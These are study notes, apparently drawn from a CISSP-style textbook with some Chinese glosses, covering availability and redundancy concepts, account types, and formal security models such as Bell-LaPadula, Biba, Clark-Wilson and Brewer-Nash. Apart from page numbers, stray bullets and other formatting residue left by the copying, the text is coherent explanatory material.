the disk image is downloaded and installed when a failure occurs. easier for administrators to restore a system than manually.
     ▪


## Nonpersistence
Persistent 持续的 images: those that stay the same nonpersistent images:
are temporary.
can exist only in RAM or be changes that are overwritten on a reboot by a persistent/frozen image.
system image: a snapshot of what exists.
Capturing an image of the operating system in its exploited state
can be helpful in revisiting the issue after the fact to learn more about it.
Most newer operating systems take snapshots of the configuration at various times and these can be manually created as well (recommended before updates or major system changes).
When something goes awry, revert to known state:
To go back to the configuration as it was before the last major change.
to roll back to a known configuration is helpful on workstations as well as servers.
live boot media:
When all else fails, you can often use live boot media to boot a system and begin
troubleshooting it.
create bootable flash drives / DVDs based on the operating system
for the live boot media to work, the system on which you are working must be
           ▪


## configured to boot from that media.
Elasticity
a major feature of cloud computing
the ability to scale up resources as needed
A number of other benefits go along with it: the time to service is a possibility, as is the mean time to implement being quicker inside rather than outside the virtual model, or resource pooling.
Other features that make elasticity so valuable include using multitenant models, and the fact that it is scalable not only up but also down, and applications are both available and portable.
Scalability
Speaking of scaling both up and down, scalability is always a desired attribute of any system.
A virtual datacenter, for example, appears the same as a physical datacenter from an administration standpoint, and it features elasticity, scalability, and so forth.
A big benefit of the virtual center is that it can employ a pay-as-you-go model.
Distributive Allocation
Commonly known as load balancing
allows for distributing the load (file requests, data routing, and so on) so that no device is overly burdened.
This can help with redundancy, availability, and fault tolerance.
         ▪


## High Availability (HA)
refers to the measures, such as redundancy, failover, mirroring, used to keep
services and systems operational during an outage.
the goal is to provide all services to all users, where they need them and when they need them.
With high availability, the goal is to have key services available 99.999 percent of the time (five nines availability).
Resiliency
apacity to recover quickly from difficulties. yielded by implementing vendor diversity.
Few things are as difficult in the world of IT as a crash or failure—be it at the server level or the server room level. This chapter is focused on how to compute and manage risk and increase your resiliency when it is economically feasible to do so. For the most part, risk resilience is a buzzword that can be equated with risk management.
Redundancy
Redundancy: systems that either are duplicated or fail over to other systems in the event of a malfunction.
Failover: reconstructing a system or switching over to other systems when a failure is detected.
Server: switches to a redundant server when a fault is detected. This strategy allows service to con- tinue uninterrupted until the primary server can be restored.
Network: processing switches to another network path in the event of a network failure in the primary path.
       ▪


##  Clustering
Many operating systems, such as Linux, Windows Server 2012, and Novell Open Enterprise Server, are capable of clustering to provide failover capabilities.
involves multiple systems connected together cooperatively (which provides load balancing) and networked in such a way that if any of the systems fail, the other systems take up the slack and continue to operate.
The overall capability of the server cluster may decrease, but the network or service will remain operational.
Not only does clustering allow you to have redundancy, but it also offers you the ability to scale as demand increases.
Most ISPs and network providers have extensive internal failover capability to provide high availability to clients. Business clients and employees who are unable to access infor- mation or services tend to lose confidence. The trade-off for reliability and trustworthi- ness, of course, is cost: failover systems can become prohibitively expensive. You’ll need to study your needs carefully to determine whether your system requires this capability. For example, if your environment requires a high level of availability, your servers should be clustered. This will allow the other servers in the network to take up the load if one of the servers in the cluster fails.
Failover systems can be expensive to implement. In a large corporate network or e-commerce environment, a failover might entail switching all processing to a remote location until your primary facility is operational. The primary site and the remote site would synchronize data to ensure that information is as up to date as possible.
Fault Tolerance
the ability of a system to sustain operations in the event of a component failure. Fault-tolerant systems can continue operation even though a critical component,
such as a disk drive, has failed. This capability involves over-engineering systems by adding redundant components and subsystems.
Fault tolerance can be built into a server by adding a second power supply, a second CPU, and other key components. Several manufacturers (such as HP, Unisys, and IBM) offer fault-tolerant servers. These servers typically have multiple processors that
     automati- cally fail over if a malfunction occurs.
In addition to fault-tolerant servers, you can have fault-tolerant implemen- tations such as Tandem, Stratus, and HP. In these settings, multiple com- puters are used to provide 100 percent availability of a single server.
There are two key components of fault tolerance that you should never overlook: spare parts and electrical power. Spare parts should always be readily available to repair any system-critical component if it should fail. The redundancy strategy “N+1” means that you have the number of components you need, plus one to plug into any system should
it be needed. For example, a small company with five stand-alone servers that are all the same model should have a power supply in a box nearby to install in any one of the serv- ers should there be a failure. (The redundancy strategy 1+1 [or 2N] has one spare part for every component in use.)
Since computer systems cannot operate in the absence of electrical power, it is imperative that fault tolerance be built into your electrical infrastructure as well. At a bare minimum, an uninterruptible power supply (UPS)—with surge protection— should accompany every server and workstation. That UPS should be rated for the load it is expected to carry in
the event of a power failure (factoring in the computer, monitor, and any other device con- nected to it) and be checked periodically as part of your preventive maintenance routine
to make sure that the battery is operational. You will need to replace the battery every few years to keep the UPS operational.
A UPS will allow you to continue to function in the absence of power for only a short duration. For fault tolerance in situations of longer duration, you will need a backup gener- ator. Backup generators run off of gasoline, propane, natural gas, or diesel and generate the electricity needed to provide steady power. Although some backup generators can come on instantly in the event of a power outage, most take a short time to warm up before they can provide consistent power. Therefore, you will find that you still need to implement UPSs within your organization.
Account Types ▪


## user account.
most obvious type of account
be assigned to human users of your network.
Each user account should have certain properties. include an expiration date as well as the type of user.
administrator accounts
special user accounts with a great deal of privileges. should be granted sparingly and monitored closely.
The topic of administrator accounts naturally leads to the broader topic of privileged accounts.
privileged account.
By definition, any account that has significant rights on the network is a privi- leged account.
domain admin account.
local admin account (or root in Linux) gives the user unfettered control of a single machine.
domain admin accounts provide the user with complete and total control of your network.
The ultimate goal of any attacker is to get domain admin privileges. must be very closely controlled.
           ▪


## generic account.
a shared account for several uses
usually not recommended. Preferred have individual accounts for individual users.
However, in some limited situations, it may be acceptable to use very low- privileged accounts that are shared.
Example
Lab that only has access to the lab systems and no other resources, have a generic account labuser, used by any student in the lab.
guest accounts.
outsiders who need to access your network
clients or business partners who are visit- ing your facilities for a brief period of time.
They should have bare minimum privileges.
have individual accounts for each guest. Or use a shared account for guests.
Principles of Security Models, Design, and Capabilities
         ▪


## Understanding the philosophy behind security solutions
how secure a system is can be difficult and time-consuming
describe the process of evaluating a computer system’s level of security
introducing and explaining basic concepts and terminology used to describe information system security concepts and talk about secure computing, secure perimeters, security and access monitors, and kernel code.
security models to explain how access and security controls can be implemented.
how system security may be categorized as either open or closed; describe a set of standard security techniques used to ensure confidentiality, integrity, and availability of data; discuss security controls; and introduce a standard suite of secure networking protocols.
Implement and Manage Engineering Processes
Using Secure Design Principles
Security should be a consideration at every stage of a system’s development.
Programmers should strive 努力 to build security into every application they develop, with greater levels of security provided to critical applications and those that process sensitive information.
It’s extremely important to consider the security implications of a development project from the early stages because it’s much easier to build security into a system than add security onto an existing system.
Objects and Subjects
Controlling access to any resource in a secure system involves two entities. Subject: user or process that makes a request to access a resource. (Access:
   ▪


## reading from or writing to a resource)
Object: the resource a user or process wants to access.
the same resource can serve as a subject and an object in different access requests.
This also serves as an example of transitive trust
Concept: A trusts B and B trusts C, then A inherits trust of C through the
transitive property
when A requests data from B and then B requests data from C, the data that A receives is essen- tially from C.
Transitive trust is a serious security concern because it may enable bypassing of restrictions or limitations between A and C, when A and C both support interaction with B.
Example:
  - organization blocks access to Facebook or YouTube to increase worker productivity.
  - Thus, workers (A) do not have access to certain Internet sites (C).
  - However, if workers are able to access to a web proxy, VPN, or anonymization service, then this can serve as a means to bypass the local network restriction.
  - workers (A) accessing VPN service (B), the VPN service (B) can access the blocked Internet service (C); thus A is able to access C through B via a transitive trust exploitation.
Closed and Open Systems
Systems are designed and built according to one of two differing philosophies:
closed system: designed to work well with a narrow range of systems, generally all from the same manufacturer.
       ▪


##   - The standards for closed systems are often proprietary and not normally disclosed.
  - Lack of integration:
  - harder to integrate with unlike systems, but can be more secure.
  - In many cases, attacking a closed system is harder than open system.
  - A closed system often comprises proprietary hardware and software that does not incorporate industry standards.
  - attacks on many generic system components either will not work or must be customized to be successful.
  - Many software and hardware components with known vulnerabilities may not exist on a closed system.
  - lack of known vulnerable
  - often necessary to possess more in-depth knowledge of the specific
target system to launch a successful attack.
Open systems: designed using agreed-upon industry standards.
  - easier to integrate with other systems from different manufacturers that support the same standards.
  - Example
  - create a LAN with a Microsoft Windows Server machine, a Linux
machine, and a Macintosh machine.
  - Although all three computers use different OS and could represent up to three different hardware architectures, each supports industry standards and makes it easy for networked / other ommunications to occur.
  - But as standard communications components are incorporated into these OS, there are far more predictable entry points and methods for launching attacks.
   - openness makes them more vulnerable to attack,
  - widespread availability makes it possible for attackers to find (and
even to practice on) plenty of potential targets.
  - more popular than closed systems and attract more attention. An attacker who develops basic attacking skills will find more targets on open systems than on closed ones.
  - This larger “market” of potential targets usually means that there is more emphasis on targeting open systems. Inarguably, there’s a greater body of shared experience and knowledge on how to attack open systems than there is for closed systems.
  Open Source vs. Close Source
   open source solution: the source code and other internal logic is exposed to the public. closed source solution: the source code and other internal logic is hidden from the public. Open source solutions often depend on public inspection and review to improve the product over time. Closed source solutions are more dependent on the vendor/programmer to revise the product over time. Both open source and closed source solutions can be available for sale or at no charge, but the term commercial typically implies closed source. However, closed source code is often revealed through either vendor compromise or through decompiling. The former is always a breach of ethics and often the law, whereas the latter is a standard element in ethical reverse engineering or systems analysis.
closed source program can be open system or closed system, open source program can be open system or closed system.
  Techniques for Ensuring Confidentiality, Integrity, and Availability
If an affected program is processing sensitive or secret data, that data’s confidentiality is no longer guaranteed.
If that data is overwritten or altered in an unpredictable way (multiple readers and writers inadvertently access the same shared data), there is no guarantee of integrity.
if data modification results in corruption or outright loss, it could become unavailable for future use. Although the concepts we discuss in the following sections all relate to ▪


## soft- ware programs, they are also commonly used in all areas of security.
Confinement 限制
Software designers use process confinement to restrict the actions of a program.
Simply put, process confinement allows a process to read and write to only certain memory locations and resources.
This is also known as sandboxing.
The operating system, or some other security component, disallows illegal read/
write requests.
  - If a process attempts to initiate an action beyond its granted authority, that action will be denied.
  - further actions, logging the violation attempt
  - Systems that must comply with higher security ratings usually record all
violations and respond in some tangible way.
Generally, the offending process is terminated.
Confinement can be implemented
  - in the OS itself (like through process isolation and memory protection),
  - through the use of a confinement application or service (like Sandboxie),
  - through a virtualization or hypervisor solution (like VMware /
VirtualBox).
Bounds
Each process that runs on a system is assigned an authority level.
In simple systems, there may be only two authority levels: user and kernel. The authority level tells the operating system what the process can do.
The authority level tells the operating system how to set the bounds for a
       ▪


## process.
The bounds of a process
  - logically bounded
  - consist of limits set on the memory addresses and resources it can access.
  - state the area within which a process is confined or contained.
  - segment logical areas of memory for each process to use.
  - It is the responsibility of the operating system to enforce these logical bounds and to disallow access to other processes.
  - physically bounded processes.
  - require each bounded process to run in an area of memory that is physically separated from other bounded processes, not logically bounded in the same memory space.
  - expensive, but more secure than logical bounds.
When a process is confined through enforcing access bounds, that process runs in
isolation. Process isolation
ensures the behavior will affect only the memory and resources associated with the isolated process.
used to protect the operating environment, the kernel of the OS, and other independent applications.
is an essential component of a stable operating system.
prevents an application from accessing the memory or resources of another application, whether for good or ill.
 Isolation
   ▪


##  The operating system may provide intermediary services, such as cut-and-paste and resource sharing (like keyboard, network interface, and storage device access).
These three concepts (confinement, bounds, and isolation) make designing secure programs and operating systems more difficult, but they also make it possible to implement more secure systems.
Controls
To ensure the security of a system, you need to allow subjects to access only authorized objects.
A control uses access rules to limit the access of a subject to an object. Access rules state which objects are valid for each subject.
an object might be valid for one type of access and be invalid for another type of access.
  - file can be read-only for most users but read-write for a small set of users who have the authority to modify it.
There are both mandatory and discretionary access controls, MAC and DAC.
  - Both mandatory and discretionary access controls limit the access to objects by subjects.
The primary goal of controls: ensure the confidentiality & integrity of data by disallowing unauthorized access by authorized or unauthorized subjects.
Trust and Assurance
Proper security concepts, controls, and mechanisms must be integrated before and during the design and architectural period in order to produce a reliably secure product.
trusted system: all protection mechanisms work together to process sensitive 1,017

▪
data for many types of users while maintaining a stable and secure computing environment.
Assurance: the degree of confidence in satisfaction of security needs.
  - Assurance must be continually maintained, updated, and reverified.
This is true if the trusted system experiences a known change or if a significant amount of time has passed. In either case, change has occurred at some level.
Change is often the antithesis of security; it often diminishes security.
  - whenever change occurs, the system needs to be reevaluated to verify that the level of security it provided previously is still intact.
  - Assurance varies from one system to another and must be established on individual systems.
  - However, there are grades or levels of assurance that can be placed across numerous systems of the same type, systems that support the same services, or systems that are deployed in the same geographic location.
  - Thus, trust can be built into a system by implementing specific security features, whereas assurance is an assessment of the reliability and usability of those security features in a real-world situation.
Security Models
In information security, models provide a way to formalize security policies. Such models can be abstract or intuitive (some are decidedly mathematical), but all are intended to provide an explicit set of rules that a computer can follow to implement the fundamental security concepts, processes, and procedures that make up a security policy. These models offer a way to deepen your understanding of how a computer operating system should be designed and developed to support a specific security policy.
A security model provides a way for designers to map abstract statements into a security policy that prescribes the algorithms and data structures necessary to build hardware and software.
security model gives software designers something against which to measure their
   ▪


## design and implementation. That model, of course, must support each part of the security policy. In this way, developers can be sure their security implementation supports the security policy.
Although no system can be totally secure, it is possible to design and build reasonably secure systems. In fact, if a secured system complies with a specific set of security criteria, it can be said to exhibit a level of trust. Therefore, trust can be built into a system and then evaluated, certified, and accredited. But before we can discuss each security model, we have to establish a foundation on which most security models are built. This foundation is the trusted computing base.
Tokens, Capabilities, and Labels
Several different methods are used to describe the necessary security attributes for an object.
A security token is a separate object that is associated with a resource and describes its security attributes. This token can communicate security information about an object prior to requesting access to the actual object.
In other implementations, various lists are used to store security information about multiple objects. A capabilities list maintains a row of security attributes
for each controlled object. Although not as flexible as the token approach, capabilities lists generally offer quicker lookups when a subject requests access to an object.
A security label, generally a permanent part of the object to which it’s attached.
  - Once a security label is set, it usually cannot be altered.
  - This permanence provides another safeguard against tampering that neither tokens nor capabilities lists provide
Trusted Computing Base
An old US Department of Defense standard known colloquially as the Orange Book (DoD Standard 5200.28) describes a trusted computing base (TCB) as a combination of hardware, software, and controls that work together to form a trusted base to enforce
   ▪


## your security policy.
The TCB is a subset of a complete information system.
It should be as small as possible so that a detailed analysis can reasonably ensure that the system meets design specifications and requirements.
The TCB is the only portion of that system that can be trusted to adhere to and enforce the security policy.
It is not necessary that every component of a system be trusted.
But any time you consider a system from a security standpoint, your evaluation should include all trusted components that define that system’s TCB.
In general, TCB components in a system are responsible for controlling access to the system.
  - The TCB must provide methods to access resources both inside and outside the TCB itself.
  - TCB components commonly restrict the activities of components outside the TCB.
  - It is the responsibility of TCB components to ensure that a system behaves properly in all cases and that it adheres to the security policy under all circumstances.
Security Perimeter
an imaginary boundary that separates the TCB from the rest of the system.
  - This boundary ensures that no insecure communications or interactions occur between the TCB and the remaining elements of the computer system.
For the TCB to communicate with the rest of the system, it must create secure channels, trusted paths.
         - trusted path: channel established with strict standards to allow necessary communication to occur without exposing the TCB to security vulnerabilities.
  - A trusted path also protects system users (subjects) from compromise as a result of a TCB interchange.
  - trusted paths are required in systems that seek to deliver high levels of security to their users.
  - According to the TCSEC guidelines, trusted paths are required for high trust level systems such as those at level B2 or higher of TCSEC.
Reference Monitors, Kernels
When the time comes to implement a secure system, it’s essential to develop some part of the TCB to enforce access controls on system assets and resources (objects).
 ▪


##  reference monitor
  - The part of the TCB that validates access to every resource prior to granting access requests
  - the reference monitor is the access control enforcer for the TCB.
  - Thus, authorized and secured actions and activities are allowed to occur, whereas unauthorized and insecure activities and actions are denied and blocked from occurring.
  - stands between every subject and object,
  - verifying that a requesting subject’s credentials meet the object’s
access requirements before any requests are allowed to proceed.
  - If such access requirements aren’t met, access requests are turned down.
  - enforces access control or authorization based the desired security model, whether discretionary, mandatory, role-based, or some other form of access control.
  - The reference monitor may be a conceptual part of the TCB; it doesn’t need to be an actual, stand-alone, or independent working system component.
security kernel.
  - The collection of components in the TCB that work together to
implement reference monitor functions
  - The reference monitor is a concept or theory that is put into practice via
the implementation of a security kernel in software and hardware.
  - The purpose of the security kernel is to launch appropriate components to
enforce reference monitor functionality and resist all known attacks.
  - The security kernel uses a trusted path to communicate with subjects. It also mediates all resource access requests, granting only those requests that match the appropriate access rules in use for a system.
The reference monitor requires descriptive information about each resource that it
 - ▪


## protects. Such information normally includes its classification and designation. When a subject requests access to an object, the reference monitor consults the object’s descriptive information to discern whether access should be granted or denied (see the sidebar “Tokens, Capabilities, and Labels” for more information on how this works).
安全策略: 勾勒出目标，却没有就如何实现目标给出任何思路。
安全模型: 架构，它给出了策略的形式，并且解决了特殊情况下的安全问题。
State Machine Model
狀態機模型, 捕獲當前的安全狀態的自動信息系統 (AIS)。據其規則集，這是決定由一個安全策略，一個 AIS的安 全狀態只能改變不同時間點，如在事件發生時或時鐘觸發它。因 此，在它的初始啟動時，AIS檢查，以確定它是否是在一個安全的 狀態。一旦AIS被確定為在一個安全的狀態，狀態機模型將確保每 次AIS訪問，這將是訪問僅在按照安全策略規則。這一過程將保證 的認可機構將過渡只是從一個安全的狀態到另一個安全的狀態。
system that is always secure no matter what state it is in.
It’s based on the computer science definition of a finite state machine (FSM).
  - An FSM combines an external input with an internal machine state to model all kinds of complex systems, including parsers, decoders, and interpreters.
  - Given an input and a state, an FSM transitions to another state and may create an output.
  - Mathematically, the next state is a function of the current state and the input next state
  - the next state = F(input, current state).
  - Likewise, the output is also a function of the input and the current state
output; that is, the output = F(input, current state).
   ▪


##  Many security models are based on the secure state concept.
  - a state is a snapshot of a system at a specific moment in time.
  - If all aspects of a state meet the requirements of the security policy, that state is considered secure.
  - A transition occurs when accepting input or producing output.
  - A transition always results in a new state (state transition).
  - All state transitions must be evaluated.
  - If each possible state transition results in another secure state, the system can be called a secure state machine.
A secure state machine model system always boots into a secure state, maintains a secure state across all transitions, and allows subjects to access resources only in a secure manner compliant with the security policy. The secure state machine model is the basis for many other security models.
Information Flow Model
focuses on the flow of information.
based on a state machine model.
The Bell-LaPadula and Biba models are both information flow models.
  - Bell-LaPadula is concerned with preventing information flow from a high security level to a low security level.
  - Biba is concerned with preventing information flow from a low security level to a high security level.
  - not only deal with the direction of information flow, also the type of flow. designed to prevent unauthorized, insecure, or restricted information flow, often
between different levels of security (these are often referred to as multilevel
     ▪


## models).
Information flow can be between subjects and objects at the same classification level as well as between subjects and objects at different classification levels.
allows all authorized information flows, whether within the same classification level or between classification levels.
prevents all unauthorized information flows, whether within the same classification level or between classification levels.
it is used to establish a relationship between two versions or states of the same object when those two versions or states exist at different points in time.
information flow dictates the transformation of an object from one state at one point in time to another state at another point in time.
The information flow model also addresses convert channels by specifically excluding all nondefined flow pathways.
Noninterference Model
based on the information flow model.
But not about the flow of information, but how the actions of a subject at a higher security level affect the system state or the actions of a subject at a lower security level.
Basically, the actions of subject A (high) should not affect the actions of subject B (low) or even be noticed by subject B.
The real concern is to prevent the actions of subject A at a high level of security classification from affecting the system state at a lower level. If this occurs,
subject B may be placed into an insecure state or be able to deduce or infer information about a higher level of classification.
         ▪


##  This is a type of information leakage and implicitly creates a convert channel.
Thus, the noninterference model can be imposed to provide a form of protection against damage caused by malicious programs such as Trojan horses.
Composition Theories
Some other models that fall into the information flow category build on the notion of how inputs and outputs between multiple systems relate to one another—which follows how information flows between systems rather than within an individual system.
These are called composition theories because they explain how outputs from one system relate to inputs to another system. There are three recognized types of composition theories:
Cascading: Input for one system comes from the output of another system.
Feedback: One system provides input to another system, which reciprocates by reversing those roles (so that system A first provides input for system B and then system B provides input to system A).
Hookup: One system sends input to another system but also sends input to exter- nal entities.
Take-Grant Model
employs a directed graph to dictate how rights can be passed from one subject to another or from a subject to an object.
Simply put, a subject with the grant right can grant another subject or another object any other right they possess. Likewise, a subject with the take right can take a right from another subject. In addition to these two primary rules, the Take-Grant model may adopt a create rule and a remove rule to generate or delete rights.
     ▪


##  The key to this model is that using these rules allows you to figure out when rights in the system can change and where leakage (unintentional distribution of permissions) can occur.
  - Take rule: Allows a subject to take rights over an object
  - Grant rule: Allows a subject to grant rights to an object
  - Create rule: Allows a subject to create new rights
  - Remove rule: Allows a subject to remove rights it has
 ⁃
Access Control Matrix
a table of subjects and objects that indicates the actions or functions that each subject can perform on each object. Each column of the matrix is an access control list (ACL). Each row of the matrix is a capabilities list. An ACL is tied to the object; it lists valid actions each subject can perform. A capability list is tied to the subject; it lists valid actions
 that can be taken on each object. From an administration perspective, using only capability lists for access control is a management nightmare. A capability list method of access control can be accomplished by storing on each subject a list of rights the subject has for every object. This effectively gives each user a key ring of accesses and rights to objects within the security domain. To remove access to a particular object, every user (subject) that has access to it must be individually manipulated. Thus, managing access on each user account is much more diffi- cult than managing access on each object (in other words, via ACLs).
Implementing an access control matrix model usually involves the following: Con- structing an environment that can create and manage lists of subjects and objects
Crafting a function that can return the type associated with whatever object is supplied to that function as input (this is important because an object’s type determines what kind of operations may be applied to it)
The access control matrix shown in Table 8.1 is for a discretionary access control system. A mandatory or rule-based matrix can be constructed simply by replacing the subject names with classifications or roles. Access control matrixes are used by systems to quickly determine whether the requested action by a subject for an object is authorized.  Bell-LaPadula Model
The US Department of Defense (DoD) developed the Bell-LaPadula model in the 1970s to address concerns about protecting classified information. Based on DoD ultilevel security policy.
The DoD manages multiple levels of classified resources, and the Bell-LaPadula multilevel model was derived from the DoD’s multilevel security policies. The classifications the DoD uses are numerous; however, discussions of classifications within the CISSP CBK are usually limited to unclassified, sensitive but unclassified, confidential, secret, and top secret. The multilevel security policy states that a subject with any level of clearance can access resources at or below its clear- ance level. However, within the higher clearance levels, access is granted only on a need-to- know basis. In other words, access to a specific object is granted to the classified levels only if a specific work task requires such access. For example, any person with a secret security clearance can access secret, confidential, sensitive but unclassified, and unclassified docu- ments but not top-secret documents. Also, to access a document within the secret level, the person seeking access must also have a need to know for that document.
By design, the Bell-LaPadula model prevents the leaking or transfer of classified infor- mation to less secure clearance levels. This is accomplished by blocking lower- classified subjects from accessing higher-classified objects. With these restrictions, the Bell-LaPadula model is focused on maintaining the confidentiality of objects. Thus, the complexities involved in ensuring the confidentiality of documents are addressed in the Bell-LaPadula model. However, Bell-LaPadula does not address the aspects of integrity or availability for objects. Bell-LaPadula is also the first mathematical model of a multilevel security policy.
Understand the Fundamental Concepts of Security Models 283
models): Subjects under lattice-based access controls are assigned positions in a lat- tice. These positions fall between defined security labels or classifications. Subjects can access only those objects that fall into the range between the least upper bound (the nearest security label or classification higher than their lattice position) and the highest lower bound (the nearest security label or classification lower than their lattice position) of the labels or classifications for their lattice position. Thus, a subject that falls between the private and sensitive labels in a commercial scheme that reads bot- tom up as public, sensitive, private, proprietary, and confidential can access only pub- lic and sensitive data but not private, proprietary, or confidential data. Lattice-
                      Lattice-Based Access Control
   This general category for nondiscretionary access controls is covered in Chapter 13, “Managing Identity and Authentication.” Here’s a quick preview on that more detailed coverage of this subject (which drives the underpinnings for most access control security
 based access controls also fit into the general category of information flow models and deal primarily with confidentiality (that’s the reason for the connection to Bell-LaPadula).
This model is built on a state machine concept and the information flow model. It also employs mandatory access controls and the lattice concept. The lattice tiers are the clas- sification levels used by the security policy of the organization. The state machine supports multiple states with explicit transitions between any two states; this concept is used because the correctness of the machine, and guarantees of document confidentiality, can be proven mathematically. There are three basic properties of this state machine:
■ ■ ■
The Simple Security Property states that a subject may not read information at a higher sensitivity level (no read up).
The * (star) Security Property states that a subject may not write information to an object at a lower sensitivity level (no write down). This is also known as the Confine- ment Property.
The Discretionary Security Property states that the system uses an access matrix to enforce discretionary access control.
These first two properties define the states into which the system can transition. No other transitions are allowed. All states accessible through these two rules are secure states. Thus, Bell-LaPadula–modeled systems offer state machine model security (see Figure 8.3).
FIGURE 8.3 The Bell-LaPadula model
Secret Classified Sensitive Unclassified
    Write up allowed Read up blocked (* Property) (SS Property)
    Write down blocked Read down allowed (* Property) (SS Property)
   An exception in the Bell-LaPadula model states that a “trusted subject”
is not constrained by the * Security Property. A trusted subject is defined as “a subject that is guaranteed not to consummate a security-breaching information transfer even if it is possible.” This means that a trusted subject is allowed to violate the * Security Property and perform a write- down, which is necessary when performing valid object declassification or reclassification.
The Bell-LaPadula properties are in place to protect data confidentiality. A subject can- not read an object that is classified at a higher level than the subject is cleared for. Because objects at one level have data that is more sensitive or secret than data in objects at a
lower level, a subject (who is not a trusted subject) cannot write data from one level to an object at a lower level. That action would be similar to pasting a top-secret memo into an unclassified document file. The third property enforces a subject’s need to know in order to access an object.
The Bell-LaPadula model addresses only the confidentiality of data. It does not address its integrity or availability. Because it was designed in the 1970s, it does not support many operations that are common today, such as file sharing and networking. It also assumes secure transitions between security layers and does not address convert channels (covered in Chapter 9, “Security Vulnerabilities, Threats, and Countermeasures”). Bell-LaPadula does handle confidentiality well, so it is often used in combination with other models that provide mechanisms to handle integrity and availability.
Biba Model
For many nonmilitary organizations, integrity is more important than confidential-
ity. Out of this need, several integrity-focused security models were developed, such as those developed by Biba and by Clark-Wilson. The Biba model was designed after the Bell-LaPadula model. Where the Bell-LaPadula model addresses confidentiality, the Biba model addresses integrity. The Biba model is also built on a state machine concept, is based on information flow, and is a multilevel model. In fact, Biba appears to be pretty similar to the Bell-LaPadula model, except inverted. Both use states and transitions. Both have basic properties. The biggest difference is their primary focus: Biba primarily protects data integrity. Here are the basic properties or axioms of the Biba model state machine:
The Simple Integrity Property states that a subject cannot read an object at a lower integrity level (no read-down).
The * (star) Integrity Property states that a subject cannot modify an object at a higher integrity level (no write-up).
In both the Biba and Bell-LaPadula models, there are two properties that are inverses of each other: simple and * (star). However, they may also be labeled as axioms, principles, or rules. What you should focus on is the simple and star designations. Take note that simple is always about read- ing, and star is always about writing. Also, in both cases, simple and star are rules that define what cannot or should not be done. In most cases, what is not prevented or disallowed is supported or allowed.
When you compare Biba to Bell-LaPadula, you will notice that they look like they are opposites. That’s because they focus on different areas of security. Where the Bell- LaPadula model ensures data confidentiality, Biba ensures data integrity.
Biba was designed to address three integrity issues:
Prevent modification of objects by unauthorized subjects.
Prevent unauthorized modification of objects by authorized subjects. Protect internal and external object consistency.
As with Bell-LaPadula, Biba requires that all subjects and objects have a classification label. Thus, data integrity protection is dependent on data classification.
Consider the Biba properties. The second property of the Biba model is pretty straight- forward. A subject cannot write to an object at a higher integrity level. That makes sense. What about the first property? Why can’t a subject read an object at a lower integrity level? The answer takes a little thought. Think of integrity levels as being like the purity level of air. You would not want to pump air from the smoking section into the clean room envi- ronment. The same applies to data. When integrity is important, you do not want unvali- dated data read into validated documents. The potential for data contamination is too great to permit such access.
Critiques of the Biba model reveal a few drawbacks:
It addresses only integrity, not confidentiality or availability.
It focuses on protecting objects from external threats; it assumes that internal threats are handled programmatically.
It does not address access control management, and it doesn’t provide a way to assign or change an object’s or subject’s classification level.
It does not prevent convert channels.
Because the Biba model focuses on data integrity, it is a more common choice for com- ▪


## mercial security models than the Bell-LaPadula model. Most commercial organizations are more concerned with the integrity of their data than its confidentiality.
Clark-Wilson Model
Although the Biba model works in commercial applications, Clark-Wilson model in 1987 specifically for the commercial environment.
The Clark-Wilson model uses a multifaceted approach to enforcing data integrity. Instead of defining a formal state machine, the Clark-Wilson model
defines each data item and allows modifications through only a small set of programs.
The Clark-Wilson model does not require the use of a lattice structure; rather, it uses a three- part relationship of subject/program/object (or subject/transaction/object) known as a triple or an access control triple. Subjects do not have direct access to objects. Objects can be accessed only through programs. Through the use of two principles— well-formed transactions and separation of duties—the Clark-Wilson model provides an effective means to protect integrity.
Well-formed transactions take the form of programs. A subject is able to access objects only by using a program, interface, or access portal (Figure 8.5). Each program has spe- cific limitations on what it can and cannot do to an object (such as a database or other resource). This effectively limits the subject’s capabilities. This is known as a constrained interface. If the programs are properly designed, then the triple relationship provides a means to protect the integrity of the object.
A constrained data item (CDI) 约束数据项. 只能由TP操纵
  - any data item whose integrity is protected by the security model.
An unconstrained data item (UDI) 非约束数据项
  - 用户可以通过简单的读写操作进行操纵
  - any data item that is not controlled by the security model.
  - Any data that is to be input and hasn’t been validated, or any output,
would be considered an unconstrained data item. An integrity verification procedure (IVP) 完整性验证过程
     ▪


##   - 检查CDI与外部现实的一致性
  - procedure that scans data items and confirms their integrity.
Transformation procedures (TPs) 转换过程
  - 可编程的抽象操作，如读、写和更改
  - are the only procedures that are allowed to modify a CDI.
  - The limited access to CDIs through TPs forms the backbone of the Clark- Wilson integrity model. (We wonder whether this is where TPS reports come from...see the movie Office Space.)
Understand the Fundamental Concepts of Security Models 287
The Clark-Wilson model uses security labels to grant access to objects, but only through transformation procedures and a restricted interface model. A restricted interface model uses classification-based restrictions to offer only subject-specific authorized information and functions. One subject at one classification level will see one set of data and have access to one set of functions, whereas another subject at a different classification level will see a different set of data and have access to a different set of functions. The different functions made available to different levels or classes of users may be implemented by either show- ing all functions to all users but disabling those that are not authorized for a specific user or by showing only those functions granted to a specific user. Through these mechanisms, the Clark-Wilson model ensures that data is protected from unauthorized changes from
any user. In effect, the Clark-Wilson model enforces separation of duties. The Clark- Wilson design makes it a good model for commercial applications.
Brewer and Nash Model (Chinese Wall)
 ▪


##   created to permit access controls to change dynamically based on a user’s previous activity (making it a kind of state machine model as well).
This model applies to a single integrated database; it seeks to create security domains that are sensitive to the notion 概念 of conflict of interest
  - Example
  - someone who works at Company C who has access to proprietary data for Company A should not also be allowed access to similar data for Company B if those two companies compete with each other
known as the Chinese Wall because it creates a class of data that defines which security domains are potentially in conflict and prevents any subject with access
to one domain that belongs to a specific conflict class from accessing any other domain that belongs to the same conflict class.
Metaphorically, this puts a wall around all other information in any conflict class. Thus, this model also uses the principle of data isolation within each conflict class to keep users out of potential conflict-of-interest situations (for example, management of company datasets). Because company relationships
   ▪


## change all the time, dynamic updates to members of and definitions for conflict classes are important.
Another way of looking at or thinking of the Brewer and Nash model is of an adminis- trator having full control access to a wide range of data in a system based on their assigned job responsibilities and work tasks. However, at the moment an action is taken against any data item, the administrator’s access to any conflicting data items is temporarily blocked. Only data items that relate to the initial data item can be accessed during the operation. Once the task is completed, the administrator’s access returns to full control.
288 Chapter 8 ■ Principles of Security Models, Design, and Capabilities Goguen-Meseguer Model
an integrity model
said to be the foundation of noninterference concep- tual theories. Often when someone refers to a noninterference model, they are actually referring to the Goguen-Meseguer model.
